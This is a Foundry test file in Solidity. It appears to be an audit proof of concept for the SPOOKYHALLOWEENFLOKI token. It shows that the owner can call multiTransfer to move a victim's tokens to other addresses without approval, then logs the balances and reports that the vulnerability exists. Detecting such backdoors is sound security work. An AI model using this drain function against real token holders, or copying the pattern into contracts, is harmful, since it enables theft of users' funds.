// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SPOOKYHALLOWEENFLOKI.sol";

contract SpookyHalloweenFlokiTest is Test {
    SPOOKYHALLOWEENFLOKI token;
    address owner = address(0xA);
    address victim = address(0xB);
    address recipient1 = address(0xC);
    address recipient2 = address(0xD);

    function setUp() public {
        // Configure mock router to return valid responses
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c))
        );
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73))
        );
        
        // Configure mock factory
        vm.mockCall(
            0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73,
            abi.encodeWithSelector(0xc9c65396), // createPair selector
            abi.encode(address(0x1111111111111111111111111111111111111111))
        );

        // Deploy token as owner
        vm.startPrank(owner);
        token = new SPOOKYHALLOWEENFLOKI();
        vm.stopPrank();
        
        // Get initial owner balance
        uint256 ownerBalance = token.balanceOf(owner);
        
        // Transfer half of owner's balance to victim
        uint256 transferAmount = ownerBalance / 2;
        vm.prank(owner);
        token.transfer(victim, transferAmount);
    }

    function testUnauthorizedFundTransfer() public {
        // Create transfer parameters
        address[] memory recipients = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        recipients[0] = recipient1;
        recipients[1] = recipient2;

        // Record balances before the trigger
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 recipient1BalanceBefore = token.balanceOf(recipient1);
        uint256 recipient2BalanceBefore = token.balanceOf(recipient2);

        console.log("--- BEFORE-Trigger Transfer ---");
        console.log("Victim Balance:         ", victimBalanceBefore);
        console.log("Recipient1 Balance:     ", recipient1BalanceBefore);
        console.log("Recipient2 Balance:     ", recipient2BalanceBefore);

        // Compute amounts to be transferred using the initial victim balance
        amounts[0] = victimBalanceBefore / 3;
        amounts[1] = victimBalanceBefore / 3;
        uint256 totalTaken = amounts[0] + amounts[1];

        console.log("--- Trigger Unauthorized Fund Transfer ---");
        // Owner transfers victim's funds without approval
        vm.prank(owner);
        token.multiTransfer(victim, recipients, amounts);
        console.log("Unauthorized transfer triggered by owner");

        console.log("--- AFTER-Trigger Transfer ---");
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 recipient1BalanceAfter = token.balanceOf(recipient1);
        uint256 recipient2BalanceAfter = token.balanceOf(recipient2);

        console.log("Victim Balance:         ", victimBalanceAfter);
        console.log("Recipient1 Balance:     ", recipient1BalanceAfter);
        console.log("Recipient2 Balance:     ", recipient2BalanceAfter);

        // Calculate balance changes
        uint256 victimLoss = victimBalanceBefore - victimBalanceAfter;
        uint256 recipient1Gain = recipient1BalanceAfter - recipient1BalanceBefore;
        uint256 recipient2Gain = recipient2BalanceAfter - recipient2BalanceBefore;

        console.log("Victim Loss:            ", victimLoss);
        console.log("Recipient1 Gain:        ", recipient1Gain);
        console.log("Recipient2 Gain:        ", recipient2Gain);
        console.log("Expected Total Transfer:", totalTaken);

        // Check if the changes match the expected unauthorized transfer
        bool unauthorizedTransferSucceeded = 
            victimLoss == totalTaken && 
            recipient1Gain == amounts[0] && 
            recipient2Gain == amounts[1];

        // Final verdict
        if (unauthorizedTransferSucceeded) {
            console.log("Vulnerability Exists: Owner was able to transfer victim's tokens without approval");
        } else {
            console.log("Vulnerability not Exist: The unauthorized transfer did not succeed as expected");
        }
    }
}